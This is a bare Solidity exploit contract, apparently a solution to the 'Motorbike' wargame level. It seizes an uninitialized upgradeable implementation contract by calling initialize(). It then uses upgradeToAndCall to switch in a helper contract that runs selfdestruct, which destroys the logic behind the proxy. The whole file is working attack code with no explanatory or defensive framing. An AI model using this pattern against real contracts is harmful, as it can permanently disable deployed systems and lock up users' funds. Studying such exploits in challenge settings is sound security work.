pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT
import "hardhat/console.sol";

contract MotorbikeAttacker {
  address implementation;

  constructor(address addr) {
    implementation = addr;
  }

  function takeControl() public {
    bytes memory callData = abi.encodeWithSignature("initialize()");
    (bool success, ) = implementation.call(callData);
    require(success);
  }

  function attack() public {
    address addr = address(new SelfDestructContract());
    bytes memory callData = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", addr, abi.encodeWithSignature("attack()"));
    (bool success, ) = implementation.call(callData);
    require(success);
  }
}

contract SelfDestructContract {
  function attack() external {
    selfdestruct(payable(address(0)));
  }
}
